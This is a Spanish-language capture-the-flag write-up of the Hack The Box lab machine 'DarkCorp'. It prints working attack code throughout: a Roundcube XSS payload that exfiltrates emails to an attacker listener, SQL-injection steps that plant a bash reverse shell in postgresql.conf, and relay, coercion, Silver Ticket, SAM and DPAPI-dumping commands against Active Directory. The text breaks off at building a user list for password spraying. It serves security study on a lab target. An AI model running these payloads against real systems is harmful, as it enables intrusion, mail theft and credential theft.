---
title: "DarkCorp - Hack The Box (Insane)"
date: 2026-05-05T12:00:00+02:00
draft: false
featureimage: "img/portada.jpg"
showHero: true
heroStyle: "basic"
description: "Resolución de la máquina DarkCorp de Hack The Box (Insane): Roundcube Webmail CVE-2024-42009, Stored XSS, PostgreSQL RCE, pivoting con Chisel, DPAPI, UPN Spoofing, SSSD y abuso de GPO."
tags: [
  "htb",
  "hackthebox",
  "darkcorp",
  "insane",
  "cve-2024-42009",
  "stored-xss",
  "roundcube",
  "postgresql",
  "sqli",
  "rce",
  "pivoting",
  "chisel",
  "active-directory",
  "silver-ticket",
  "dpapi",
  "upn-spoofing",
  "kerberos",
  "sssd",
  "gpo-abuse"
]
categories: ["Writeups", "Hack The Box", "Active Directory"]
showTableOfContents: true
---

El día de hoy vamos a pwnear una máquina de **Hack The Box** llamada `DarkCorp`, de dificultad **Insane**, donde tocaremos un abanico muy completo de técnicas tanto web como de pivoting y Active Directory:

- **CVE-2024-42009 (Roundcube Webmail):** Sanitization Bypass en SVG/HTML con Stored XSS.
- **Exfiltración de correos vía XSS:** Lectura y exfiltración de emails internos con JavaScript.
- **SQLi -> RCE en PostgreSQL:** Inyección SQL y ejecución remota de comandos modificando `postgresql.conf` mediante Large Objects (`lo_import`, `lo_export`, `pg_reload_conf`).
- **Pivoting con Chisel y Proxychains:** Enrutamiento hacia la red interna (`172.16.20.0/24`).
- **NTLM Relay + DNSAdmins:** Creación de registros DNS maliciosos mediante relay contra LDAPS.
- **Coerción con PrinterBug (MS-RPRN) + AD CS:** Petición de certificado de máquina (`WEB-01$`) abusando de Kerberos Relay.
- **Silver Ticket (CIFS) & DPAPI Dumping:** Extracción de secretos y credenciales en texto claro con NetExec.
- **Password Spraying:** Detección de cuentas válidas en el dominio (`john.w`).
- **UPN Spoofing & Shadow Credentials:** Suplantación de identidad para autenticarnos como `angela.w.adm` (`LINUX_ADMINS`).
- **Kerberos Authentication en Linux (`ksu`):** Escalada local a root.
- **Extracción de caché de SSSD (`cache_*.ldb`):** Volcado y crackeo de hashes de administradores (`taylor.b.adm`).
- **Abuso de GPOs (`pyGPOAbuse`):** Inyección de directivas de grupo para añadir al usuario al grupo local `Administrators` del Domain Controller.
- **DCSync / Secretsdump & Pass-The-Hash:** Volcado de NTDS.dit y acceso final como `Administrator`.

Empezamos enviando una traza ICMP a la máquina víctima para asegurarnos de que hay comunicación con ella:

```bash
ping -c 1 10.129.232.7
```

![](<img/Pasted image 20260503195540.png>)

Una vez confirmamos que el paquete llega, podemos observar que el TTL es 127. Podemos deducir que se trata de una máquina Windows porque por defecto tiene un TTL de 128 (decrementado en 1 al pasar por el túnel VPN). Vamos a tirar un escaneo rápido de puertos con Nmap:

```bash
sudo nmap -sS -Pn -n -vvv --min-rate 5000 10.129.232.7 -p-
```

![](<img/Pasted image 20260503195852.png>)

En este caso tiene los puertos 22 y 80 abiertos. Vamos a ver qué servicios y versiones están corriendo en ellos:

```bash
sudo nmap -sCV -p22,80 10.129.232.7
```


![](<img/Pasted image 20260503201104.png>)

Perfecto, Nginx (servidor web o reverse proxy). Vamos a entrar con el navegador:

![](<img/Pasted image 20260503201250.png>)

Qué raro, nos ha redirigido directamente a "drip.htb". Vamos a hacer un `curl` para ver qué está pasando:

```bash
curl http://10.129.232.7
```

![](<img/Pasted image 20260503201304.png>)

Vale, en este caso tiene una etiqueta `<meta>` que redirige directamente al vhost, por lo que añadimos ese dominio a `/etc/hosts`:

```bash
sudo bash -c "echo -e '\n10.129.232.7\tdrip.htb' >> /etc/hosts" # tengo zsh por eso pongo bash -c
```

![](<img/Pasted image 20260503201423.png>)

Perfecto, entramos de nuevo:

![](<img/Pasted image 20260503201436.png>)

Ahora sí carga, es una landing page. Mientras le echamos un ojo a la página, lanzamos en segundo plano Gobuster para buscar directorios o archivos ocultos, ya que en `robots.txt` no hay nada:

```bash
gobuster dir -u https://drip.htb -w /usr/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php,xml,zip,html,png,jpeg,css,xslx,docx,txt,bak
```

![](<img/Pasted image 20260503212008.png>)

No ha encontrado nada. Si ponemos el cursor encima del botón "Sign-in", vemos que nos redirige a otro subdominio: `mail.drip.htb`:

![](<img/Pasted image 20260503202944.png>)

Como vemos que puede haber subdominios dentro del vhost, vamos a usar `ffuf` para buscar otros subdominios virtuales cambiando la cabecera `Host` de HTTP:

```bash
ffuf -u https://10.129.232.7 -H "Host: FUZZ.drip.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-topmillion-200000.txt -ac
```

![](<img/Pasted image 20260503202632.png>)

En este caso solo nos encuentra el que ya teníamos (`mail`), así que lo añadimos también a `/etc/hosts`:

![](<img/Pasted image 20260503202754.png>)

Vamos a entrar:

![](<img/Pasted image 20260503203705.png>)

Al entrar a `mail.drip.htb` nos pide crearnos una cuenta. Vamos a probar a ver si funciona:

![](<img/Pasted image 20260503203718.png>)

Perfecto, nos logueamos:

![](<img/Pasted image 20260503203731.png>)

Parece que estamos en un cliente de webmail. Nos ha llegado un correo de bienvenida, aunque de momento no nos dice mucho:

![](<img/Pasted image 20260503203749.png>)
Si volvemos a la página inicial y revisamos el código fuente, encontramos algo interesante en el formulario de contacto. Vamos a interceptarlo con Burp Suite:
![](<img/Pasted image 20260503203947.png>)

Lo enviamos e interceptamos la petición:

![](<img/Pasted image 20260503204004.png>)

Vale... Vemos que tiene un input `hidden` en el formulario indicando el correo destinatario. Vamos a poner nuestro propio correo a ver si nos llega:

![](<img/Pasted image 20260503204738.png>)

Perfecto, sí que llega:

![](<img/Pasted image 20260503205005.png>)

Lo malo es que hemos metido etiquetas HTML en el correo, pero las interpreta como texto plano:

![](<img/Pasted image 20261011030611.png>)

Analizando más atentamente la petición en Burp, vemos que hay un parámetro llamado `content` con el valor `text`. Vamos a cambiarlo a `html` para ver si lo interpreta:

![](<img/Pasted image 20260503205205.png>)

Perfecto, funciona:

![](<img/Pasted image 20260503205237.png>)
Vamos a probar un XSS básico:
![](<img/Pasted image 20260503210908.png>)

No llega a interpretar el código JavaScript:

![](<img/Pasted image 20260503210938.png>)
Bueno, vamos a revisar la versión del servicio:

![](<img/Pasted image 20260503204118.png>)

Tenemos la versión 1.6.7 de Roundcube Webmail, por lo que buscando vulnerabilidades conocidas encontramos el siguiente CVE:

https://nvd.nist.gov/vuln/detail/CVE-2024-42009

Este CVE describe un fallo de validación inadecuada de entradas (`Improper Input Validation`) en la forma en que intenta sanitizar el contenido. La sanitización la realiza con la siguiente regex:

```bash
/\s?bgcolor=["\']*[a-z0-9#]+["\']*/i
```

La clave es que podemos jugar con esa regex para que sea ella misma la que nos arme el script malicioso por nosotros. Si enviamos un código como este:

```html
<body title="bgcolor=foo" name="bar onload=alert(origin)">
```

Al pasarlo por la regex se convierte en esto:

```html
<body title=" name="bar onload=alert(origin)">
```

Si lo probamos:

![](<img/Pasted image 20260503211148.png>)

Llega el correo. Vamos a abrirlo:

![](<img/Pasted image 20260503211209.png>)

Perfecto, en este caso funciona (podríamos haber probado el exploit enviándonos un correo a nosotros mismos :P):

![](<img/Pasted image 20260503211251.png>)

Ahora montamos un script en JavaScript (gracias Gemini) para iterar y leer los correos de la bandeja de entrada (lo codificaremos en Base64) y exfiltrarlos a nuestro listener:

```javascript
for (let i = 1; i <= 100; i++) {
	fetch("http://mail.drip.htb/?_task=mail&_caps=pdf=1,flash=0,tiff=0,webp=1,pgpmime=0&_uid=" + i + "&_mbox=INBOX&_framed=1&_action=preview", {
		mode: 'no-cors'
	}).then((response) => response.text()).then((text) => {
		fetch("http://192.168.132.128:8000", {
			mode: 'no-cors',
			method: "POST",
			body: text
		})
	});
}
```

![](<img/Pasted image 20260503214848.png>)

Quedando el payload de la siguiente manera:

```html
<body title="bgcolor=foo" name="bar onload=eval(atob(<script encodeado en base64>))">
```

Ahora debemos crear el "backend" o listener que se encargue de recibir las peticiones POST y parsearlas para mostrarlas legibles (nada fancy). Para ello utilizaremos Python:

```python
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import re
import IPython
from pwn import log

class S(BaseHTTPRequestHandler):
	def log_message(self, format, *args):
		pass
	def _set_headers(self):
		self.send_response(200)
		self.send_header('Content-type', 'text/html')
		self.end_headers()
	def do_GET(self):
		self._set_headers()
	def do_HEAD(self):
		self._set_headers()
	def do_POST(self):
		content_length = int(self.headers['Content-Length'])
		post_data = self.rfile.read(content_length)
		self._set_headers()
		#print(post_data.decode())
		try:
			username_pattern = r'"mailbox":"INBOX","username":"(.*)","permaurl"'
			username = re.search(username_pattern, post_data.decode())[1]
			from_pattern = r'<span>From <span class="adr"><a href="mailto:(.*)" class="rcmContactAddress"'
			from_address = re.search(from_pattern, post_data.decode())[1]
			message_pattern = r'<div id="messagebody"><div class="message-part" id="message-part1"><div class="pre">(.*)<br>'
			message_body = re.search(message_pattern, post_data.decode(), re.DOTALL)[1]
			log.info(f"From: {from_address}")
			log.info(f"To: {username}")
			log.info(f"Message: {message_body}")
		except Exception as e:
			#print(e)
			pass

def run(server_class=HTTPServer, handler_class=S, port=8000):
		server_address = ('', port)
		httpd = server_class(server_address, handler_class)
		print(f'Starting httpd on {port}...')
		httpd.serve_forever()
if __name__ == "__main__":
	from sys import argv
	if len(argv) == 2:
		run(port=int(argv[1]))
	else:
		run()
```

Perfecto. Después de probar enviando a diferentes cuentas internas, en el buzón de `bcase@drip.htb` interceptamos un correo de `ebelford` donde le habla de un panel de información/analíticas y le avisa de que tiene que cambiar la contraseña:

![](<img/Pasted image 20260503221841.png>)

Añadimos ese subdominio a `/etc/hosts`:

![](<img/Pasted image 20260503222057.png>)

Accedemos:

![](<img/Pasted image 20260503222158.png>)

Entramos al login, le damos a "olvidé mi contraseña" y ponemos el correo:

![](<img/Pasted image 20260503222327.png>)

Lo enviamos:

![](<img/Pasted image 20260503222336.png>)

Perfecto, lo recibimos en Roundcube. Abrimos el enlace de recuperación:

![](<img/Pasted image 20260503222426.png>)

Ponemos la contraseña que queramos:

![](<img/Pasted image 20260503222446.png>)

Y ya estamos dentro, ¡yay!:

![](<img/Pasted image 20260503222617.png>)

Revisando el panel lateral, aparte del panel inicial encontramos una sección llamada "Analytics". Nada más entrar, nos salta un error de SQL:

![](<img/Pasted image 20260503222703.png>)

Si introducimos un payload básico de SQLi:

```sql
isma' OR 1=1-- -
```

![](<img/Pasted image 20260503223004.png>)

En este caso deja de mostrarnos el error:

![](<img/Pasted image 20260503223015.png>)

Así que tenemos SQLi confirmada. Vamos a comprobar la versión de PostgreSQL:

```SQL
'isma' ; SELECT version; --'
```

![](<img/Pasted image 20260503223431.png>)

Es PostgreSQL 15. Ahora vamos a verificar si somos superusuarios en la base de datos:

```SQL
'isma' ; SELECT current_setting('is_superuser'); --'
```

![](<img/Pasted image 20260503224328.png>)

¡Efectivamente lo somos! Vamos directos a por el RCE. Para ello, debemos leer la configuración de PostgreSQL (`postgresql.conf`) usando Large Objects (`lo_import`):

```SQL
'isma' ; lo_import('/etc/postgresql/15/main/postgresql.conf'); --'
```

![](<img/Pasted image 20260503225005.png>)

Una vez cargada nos devolverá un ID (OID). Usamos ese ID con `lo_get` para mostrar el archivo de configuración:

```SQL
'isma' ; SELECT encode(lo_get({ID_DEVUELTO}), 'escape'); --'
```

![](<img/Pasted image 20260503225035.png>)

Perfecto. Copiamos la configuración y la editamos en nuestra máquina. Activamos y modificamos los siguientes parámetros:

```diff
# postgresql.conf

-archive_mode=on
+archive_mode = always   
-archive_command = ''
+archive_command = 'echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDEvNDQzIDA+JjE=" | base64 --decode | bash'
-#archive_timeout=0
+archive_timeout = 1 
```

![](<img/Pasted image 20260503225705.png>)

Lo que está codificado en Base64 es un one-liner de una reverse shell básica en Bash (asumiendo que corre sobre Linux y tiene Bash; si no, tocaría usar PowerShell):

```bash
bash -i >& /dev/tcp/10.10.14.141/443 0>&1 #sin encodear
```

![](<img/Pasted image 20260503225503.png>)

Ahora codificamos toda la configuración modificada en Base64:

![](<img/Pasted image 20260503230305.png>)

Y creamos un nuevo Large Object (con el OID que queramos, por ejemplo 99999) subiendo la configuración modificada con `lo_from_bytea`:

```SQL
'isma' ; SELECT lo_from_bytea(99999, decode('{encoded_config}', 'base64')); --'
```

![](<img/Pasted image 20260503230407.png>)

La exportamos sobre el archivo original de configuración con `lo_export`:

```SQL
'isma' ; SELECT lo_export(99999, '/etc/postgresql/15/main/postgresql.conf'); --'
```

![](<img/Pasted image 20260503230551.png>)

Ponemos Netcat a la escucha para recibir la reverse shell:

```bash
nc -nvlp 443
```

![](<img/Pasted image 20260503230656.png>)

Y finalmente recargamos la configuración de PostgreSQL ejecutando `pg_reload_conf()`:

```SQL
'isma'; SELECT pg_reload_conf(); --'
```

![](<img/Pasted image 20260503230731.png>)

Volvemos a Netcat y... ¡ya tenemos reverse shell!:

![](<img/Pasted image 20260503230752.png>)

Hacemos el tratamiento de la TTY para tener una shell totalmente interactiva:

```bash
script /dev/null -c bash

^Z # conjunto de teclas (Ctrl+Z)

stty size # para saber el tamaño de la terminal

stty raw -echo; fg

reset
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 70 columns 180 # (el tamaño que stty nos ha dado)
```

![](<img/Pasted image 20260503231718.png>)

Imprimimos por pantalla el archivo `/etc/hosts` para ver si existen otros subdominios o hosts en la red interna:

```bash
cat /etc/hosts
```

![](<img/Pasted image 20260503231849.png>)

Nos chiva que en otro segmento de red hay un Domain Controller (`172.16.20.1`), por lo que esta máquina tiene más de una interfaz de red. Listamos `/etc/passwd` para ver qué usuarios existen en el sistema:

```bash
cat /etc/passwd
```

![](<img/Pasted image 20260503231912.png>)

En este caso solo está `ebelford` (el mismo que envió el correo). Vamos a su `/home`, pero no tenemos permisos de lectura:

![](<img/Pasted image 20260503232046.png>)

Nos establecemos como `HOME` `/var/lib/postgresql` (indicado en `/etc/passwd`) para trabajar con mayor comodidad:

```bash
HOME="/var/lib/postgresql"
cd
```

![](<img/Pasted image 20260503232138.png>)

Ahora que tenemos una shell cómoda, vamos a inspeccionar directamente las bases de datos de PostgreSQL con la consola interactiva:

```bash
psql -U postgres
```

Listamos las bases de datos disponibles:

```postgresql
\list
```

![](<img/Pasted image 20260503232522.png>)

Nos conectamos a la base de datos `dripmail`:

```postgresql
\connect dripmail
```

![](<img/Pasted image 20260503232532.png>)

Imprimimos el contenido de la tabla `Admins`:

```postgresql
select * from "Admins"
```

![](<img/Pasted image 20260503232543.png>)

Guardamos el hash en un archivo de texto:

```bash
echo "b65cb932ad941c2de600ff3c5c0c9a56" > hash-bcase.txt
```

![](<img/Pasted image 20260503232638.png>)

Y lo crackeamos con Hashcat:

```bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt
```

![](<img/Pasted image 20260503234102.png>)

En este caso encuentra la contraseña que habíamos cambiado previamente nosotros. Vamos a revisar la tabla `Users`:

```postgresql
select * from Users;
```

![](<img/Pasted image 20260503234131.png>)

Guardamos los hashes y los pasamos por Hashcat:

```bash
echo -e "d9b9ecbf29db8054b21f303072b37c4e\n1eace53df87b9a15a37fdc11da2d298d\n0cebd84e066fd988e89083879e88c5f9" > hashes.txt

hashcat hashes.txt /usr/share/wordlists/rockyou.txt
```

![](<img/Pasted image 20260503235111.png>)

Hashcat devuelve `Exhausted`, así que no ha conseguido crackear ninguno con RockYou. Volvemos al home de `postgres`. Teniendo en cuenta que somos superusuarios en PostgreSQL, vamos a buscar en los logs del servicio por si encontramos alguna contraseña filtrada de `ebelford`:

```bash
cd /var/log/postgresql
zcat *.gz | grep 'ebelford'
```

![](<img/Pasted image 20260504080938.png>)

¡Perfecto! Encontramos un hash en los logs comprimidos. Vamos a crackearlo:

```bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt 
```

![](<img/Pasted image 20260504093139.png>)
¡Tenemos credenciales válidas! Si las probamos por SSH vemos que funcionan. Pero antes de pasar a `ebelford`, veamos si hay algo más accesible con el usuario `postgres`:
![](<img/Pasted image 20260504080844.png>)

Encontramos un directorio de backups en `/var/backups`:

```bash
cd backups
```

![](<img/Pasted image 20260504080859.png>)

Hay un directorio exclusivo de `postgres`, entramos:

```bash
cd postgres && ls
```

![](<img/Pasted image 20260504095143.png>)

Hay un archivo cifrado con contraseña mediante GPG:

```bash
file dev-dripmail.old.sql.gpg
```

![](<img/Pasted image 20260504095313.png>)

Revisamos si en `/var/www/` hay algún archivo de configuración con credenciales:

```bash
cd /var/www/ && ls
```

![](<img/Pasted image 20260504095354.png>)

Buscamos archivos `.env` en `/var/www`:

```bash
find . -type f -name ".*env*" 2>/dev/null
cat www/html/dashboard/.env
```

![](<img/Pasted image 20260504095556.png>)

¡Tenemos una credencial! Vamos a ver si se reutilizan contraseñas para descifrar el backup en GPG:

```bash
gpg --batch -d dev-dripmail.old.sql.gpg
```

![](<img/Pasted image 20260504111056.png>)

¡Perfecto! Se ha descifrado el dump de base de datos:

![](<img/Pasted image 20260504111339.png>)

Buscamos credenciales de administradores dentro del archivo dump:

![](<img/Pasted image 20260504113117.png>)

Más hashes MD5, intentamos crackearlos:

```bash
hashcat -m 0 hashes2.txt --show
```

![](<img/Pasted image 20260504113410.png>)

Obtenemos de nuevo la credencial de `ebelford` y además la de `victor.r` (`victor1gustavo@#`). Revisamos si hay algo más que rascar a nivel de privilegios locales antes de probar las credenciales contra el dominio:

```bash
find / -type f -writable 2>/dev/null
find / -type f -perm 4000 2>/dev/null
```

![](<img/Pasted image 20260504100736.png>)

No encontramos binarios SUID ni archivos escribibles fuera de lo común, así que nos conectamos por SSH como `ebelford` para trabajar con una sesión limpia:

```bash
ssh ebelford@10.127.232.7
```

![](<img/Pasted image 20260504093723.png>)

Establecemos una carpeta temporal como `HOME` durante esta sesión para trabajar de forma ordenada:

```bash
HOME=$(mktemp -d)
echo $HOME
cd
```

![](<img/Pasted image 20260504100717.png>)

Intentamos descargar Chisel:

```bash
wget "https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz"
```

La máquina no puede resolver `github.com`, por lo que confirmamos que no tiene acceso a internet:

![](<img/Pasted image 20260504101633.png>)

Así que lo descargamos en nuestra máquina atacante y lo transferimos mediante HTTP. Lo descomprimimos, renombramos y le damos permisos de ejecución:

```bash
wget "https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz"
gzip -d chisel*.gz && rm chisel*.gz && mv chisel* chisel && chmod +x chisel
```

![](<img/Pasted image 20260504102305.png>)

Hacemos lo mismo con un binario estático de Nmap. Aunque no podemos hacer escaneo SYN (-sS) porque requeriría privilegios de root, con Nmap podremos detectar servicios y versiones:

```bash
wget "https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/nmap"
chmod +x nmap
```

![](<img/Pasted image 20260504102414.png>)

Nos descargamos ambos binarios en la máquina objetivo:

```bash
wget http://10.10.14.141:8081/nmap
wget http://10.10.14.141:8081/chisel
ls
```

![](<img/Pasted image 20260504102551.png>)
Para pivotar, ejecutamos Chisel como servidor en modo reverso en nuestra máquina atacante:

```bash
sudo ./chisel server --reverse -p 443 # En nuestra máquina atacante

# En la máquina objetivo
./chisel client 10.10.14.141:443 R:socks &
```

![](<img/Pasted image 20260504103041.png>)
La conexión se establece con éxito. Hemos utilizado el puerto 443 por temas de OPSEC. Ahora configuramos Proxychains para redirigir el tráfico a través del túnel SOCKS5 de Chisel (puerto 1080):

```bash
sudo bash -c "echo -e '\nsocks5\t127.0.0.1 1080' >> /etc/proxychains4.conf"

cat /etc/proxychains4.conf
```

![](<img/Pasted image 20260504103216.png>)
Una vez configurado, hacemos un barrido de IPs en la subred interna (`172.16.20.0/24`). Me apetecía hacerlo con un loop en Bash aprovechando trazas ICMP:

```bash
set +m; for i in {1..254}; do (ping -c 1 -W1 172.16.20.$i &>/dev/null && echo "[+] - La IP 172.16.20.$i está activa.") & done; wait
```

![](<img/Pasted image 20260504104607.png>)
Encontramos 3 hosts activos. Como sabemos que hay un Domain Controller, utilizamos NetExec (`nxc`) a través de Proxychains para identificarlos:

```bash
proxychains -q nxc smb 172.16.20.1
```

![](<img/Pasted image 20260504104657.png>)

La `.1` es el Domain Controller (`DC-01`):

```bash
proxychains nxc smb 172.16.20.2
```

![](<img/Pasted image 20260504104902.png>)
En la `.2` tenemos un servidor llamado `WEB-01` (la `.3` es la propia interfaz interna de nuestra máquina pivote). Lanzamos un escaneo de puertos con el binario de Nmap sobre `WEB-01`:

```bash
nmap -p- -Pn -n -vvv --min-rate 5000 172.16.20.2
```

![](<img/Pasted image 20260504105250.png>)
Tiene abiertos los puertos 80 y 445. Ahora escaneamos el Domain Controller (`172.16.20.1`):

```bash
nmap -p- -Pn -n -vvv --min-rate 5000 172.16.20.1
```

![](<img/Pasted image 20260504105423.png>)
El DC tiene también SSH habilitado. Empezamos investigando el servidor `WEB-01`. Entramos al puerto 80 con el navegador (usando FoxyProxy apuntando al SOCKS de Chisel) y encontramos la página por defecto de IIS de Windows Server; nada relevante aquí:

![](<img/Pasted image 20260504105940.png>)

En la `172.16.20.1` está el servicio de correo:

![](<img/Pasted image 20260504110028.png>)
Nos redirige directamente al dominio como antes:
![](<img/Pasted image 20260504110040.png>)

En `172.16.20.2` en el puerto 5000 encontramos un panel de login:

![](<img/Pasted image 20260504110105.png>)

Probamos las credenciales obtenidas contra SMB en `WEB-01`:

```bash
proxychains -q nxc smb 172.16.20.2 -u ebelford -p ThePlague@1780
```

![](<img/Pasted image 20260504190627.png>)
El usuario `ebelford` no existe en el Active Directory, así que probamos con `victor.r` contra el DC:

```bash
proxychains -q netexec smb 172.16.20.1 -u victor.r -p 'victor1gustavo@#' --shares
```

![](<img/Pasted image 20260504190508.png>)
¡Credenciales válidas! Tenemos un usuario del dominio. Vamos a enumerar la configuración del Active Directory con NetExec para ver vectores potenciales:
```cmd
proxychains netexec ldap 172.16.20.1 -u victor.r -p victor1gustavo@# -M maq -M adcs
```

![](<img/Pasted image 20260504190727.png>)

Vemos que `MachineAccountQuota` (MAQ) es 0, por lo que no podemos crear cuentas de equipo para abusar de RBCD directamente, pero el DC expone servicios web de AD CS (Active Directory Certificate Services). Antes de profundizar ahí, recolectamos información completa del dominio con BloodHound:

```bash
proxychains bloodhound-python -d darkcorp.htb -u victor.r -p 'victor1gustavo@#' -c all -ns 172.16.20.1 --dns-tcp --zip -gc dc-01.darkcorp.htb
```

![](<img/Pasted image 20260504191851.png>)
No tenemos una vía directa a Domain Admin con `victor.r`, así que seguimos buscando otros vectores:
![](<img/Pasted image 20260504195144.png>)
Probamos las credenciales de `victor.r` en el panel web del puerto 5000 de `WEB-01`:
![](<img/Pasted image 20260504195910.png>)
¡Estamos dentro! Tenemos un panel de administración que nos muestra el estado de varios servidores (`WEB-02`, `WEB-03`, `DB-01`, `DB-02`) caídos o inaccesibles. A ver para qué sirve esta funcionalidad:
![](<img/Pasted image 20260504200456.png>)
El panel incluye una herramienta para comprobar el estado de los hosts mediante peticiones HTTP. Como el puerto 8080 en `WEB-01` está cerrado, configuramos un reenvío de puertos con Chisel para exponer nuestro puerto 8000 en el puerto 8080 de `WEB-01`:

```bash
./chisel client 10.10.14.141:4443 8080:0.0.0.0:8000 R:socks &
```

![](<img/Pasted image 20260504205154.png>)
Montamos `ntlmrelayx` a la escucha en el puerto 8000 por si la aplicación web realiza autenticación NTLM al consultar el endpoint:

```bash
sudo proxychains -q ntlmrelayx.py -t ldap://172.16.20.1 --http-port 8000
```

![](<img/Pasted image 20260504204948.png>)
Lanzamos la comprobación desde la interfaz web:
![](<img/Pasted image 20260504205030.png>)
¡Obtenemos autenticación NTLM de la cuenta de servicio `SVC_ACC`! Se autentica contra el dominio, así que intentamos hacer relay contra la interfaz web de AD CS (`certsrv`) para solicitar un certificado PFX:

```bash
sudo proxychains -q ntlmrelayx.py -t https://dc01.darkcorp.htb/certsrv/certfnsh.asp --adcs --http-port 8000
```

![](<img/Pasted image 20260504205110.png>)
En este caso no nos permite solicitar el certificado directamente. Revisando BloodHound, descubrimos que la cuenta `SVC_ACC` es miembro del grupo `DNSADMINS`:
![](<img/Pasted image 20261012160852.png>)

Al ser miembro de DNSAdmins, podemos crear registros DNS en el dominio mediante NTLM Relay contra LDAPS. Creamos un nuevo registro DNS malicioso que apunte a la IP de nuestra máquina atacante:

```bash
sudo proxychains -q ntlmrelayx.py -t ldaps://172.16.20.1 --http-port 8000 --add-dns-record 'dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.14.141 --no-dump --no-da --no-validate-privs
```

![](<img/Pasted image 20260504210130.png>)
Comprobamos con `nslookup` que el nuevo registro DNS resuelve correctamente:

```bash
nslookup dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.darkcorp.htb
```

![](<img/Pasted image 20260504210221.png>)
Ponemos `krbrelayx.py` a la escucha para interceptar la autenticación Kerberos y solicitar un certificado PFX para la cuenta de equipo `WEB-01$` contra AD CS:

```bash
sudo proxychains -q ./krbrelayx.py -t 'https://dc-01.darkcorp.htb/certsrv/certfnsh.asp' --adcs -v 'WEB-01$'
```

![](<img/Pasted image 20260504215542.png>)
Nos aprovechamos del registro DNS creado para coaccionar a la máquina `WEB-01` a autenticarse contra nosotros mediante `MS-RPRN` (PrinterBug). Al forzar la notificación de cambio de estado hacia nuestro registro DNS, la autenticación se realiza con la cuenta de máquina (`WEB-01$`) del dominio. Al retransmitirla contra AD CS (`certsrv`), conseguimos el certificado `.pfx` for free :P:

```bash
proxychains -q uv run --script ./printerbug.py 'darkcorp/victor.r':'victor1gustavo@#'@WEB-01.darkcorp.htb dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

![](<img/Pasted image 20260504215553.png>)
Aunque la salida pueda parecer ambigua, listamos el directorio y confirmamos que se ha generado:

```bash
ls | grep ".pfx"
```

![](<img/Pasted image 20260504215620.png>)

Tenemos el certificado `WEB-01.pfx`. Con Certipy solicitamos un TGT y obtenemos el hash NT de la cuenta de máquina `WEB-01$`:`

```bash
sudo proxychains -q certipy auth -pfx 'WEB-01.pfx' -domain darkcorp.htb -dc-ip 172.16.20.1
```

![](<img/Pasted image 20260504215754.png>)
Con el hash NT de `WEB-01$`, obtenemos el Domain SID mediante `lookupsid.py`:

```bash
proxychains -q lookupsid.py -hashes :8f33c7fc7ff515c1f358e488fbb8b675 'darkcorp.htb/WEB-01$@DC-01.darkcorp.htb'
```

![](<img/Pasted image 20260504220022.png>)
Con el Domain SID y el hash NT de la máquina, forjamos un Silver Ticket (CIFS) como `Administrator` local de `WEB-01` usando `ticketer.py`:

```bash
ticketer.py -nthash 8f33c7fc7ff515c1f358e488fbb8b675 -domain darkcorp.htb -domain-sid S-1-5-21-3432610366-2163336488-3604236847 -spn cifs/web-01.darkcorp.htb Administrator
```

![](<img/Pasted image 20260504220104.png>)
Utilizamos el archivo `.ccache` con NetExec para interactuar con SMB en `WEB-01`. Confirmamos acceso de administrador (`(Pwn3d!)`) y procedemos a dumpear la SAM:

```bash
KRB5CCNAME=Administrator.ccache proxychains -q netexec smb web-01.darkcorp.htb -k --use-kcache

KRB5CCNAME=Administrator.ccache proxychains -q netexec smb web-01.darkcorp.htb -k --use-kcache --sam
```

![](<img/Pasted image 20260504220150.png>)
Con el hash NT del Administrator local de `WEB-01`, nos conectamos vía Evil-WinRM:

```bash
proxychains -q /home/isma/.local/share/gem/ruby/3.4.0/bin/evil-winrm -i 172.16.20.2 -u administrator -H 88d84ec08dad123eb04a060a74053f21
```

![](<img/Pasted image 20260504220756.png>)
Una vez dentro, capturamos la flag de usuario (`user.txt`):

```powershell
cd ..\Desktop
type user.txt
```

![](<img/Pasted image 20260504221013.png>)
Enumeramos el sistema de archivos en busca de vectores de escalada:

```bash
tree /f .
```

![](<img/Pasted image 20260504221023.png>)
Encontramos un script de PowerShell llamado `cleanup.ps1`... huele a tarea programada (sé que estamos en Windows, pero "tarea cron" suena más familiar :P). Listamos su contenido:

```powershell
type Documents\cleanup\cleanup.ps1
```

![](<img/Pasted image 20260504221302.png>)
Simplemente comprueba si el servicio `w3svc` (IIS) está corriendo y, si no lo está, lo arranca:

```powershell
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select-Object TaskName, @{Name="User";Expression={$_.Principal.UserId}}, @{Name="Command";Expression={($_.Actions.Execute + " " + $_.Actions.Arguments).Trim()}} | Format-Table -AutoSize
```

![](<img/Pasted image 20260504221647.png>)
Revisando los detalles de la tarea programada, vemos que se ejecuta en el contexto de nuestro usuario. Esto significa que sus credenciales están protegidas con DPAPI. Las dumpeamos directamente con NetExec aprovechando el Silver Ticket:

```bash
KRB5CCNAME=Administrator.ccache proxychains -q netexec smb 172.16.20.2 -u administrator --use-kcache --dpapi
```

![](<img/Pasted image 20260504224147.png>)
Probamos la contraseña recuperada (`But_Lying_Aid9!`) contra `WEB-01`:

```bash
proxychains -q netexec smb 172.16.20.2 -u administrator -p But_Lying_Aid9! --local-auth
```

![](<img/Pasted image 20260504224237.png>)
Al usar `--local-auth` con la contraseña en texto claro, NetExec descifra las Master Keys de DPAPI y nos entrega una nueva credencial: `Pack_Beneath_Solid9!`. Ahora listamos todos los usuarios del dominio para hacer password spraying con esta clave:

```cmd
proxychains -q netexec smb 172.16.20.1 -u victor.r -p victor1gustavo@# --users
```
![](<img/Pasted image 20260504224531.png>)
Filtramos la lista de usuarios con `awk` y `grep` para generar un diccionario limpio:

```cmd
proxychains -q netexec smb 172.16.20.1 -u victor.r -p victor1gustavo@# --users | awk '{print $5}' | grep -v '[\[-]' > users.txt
```
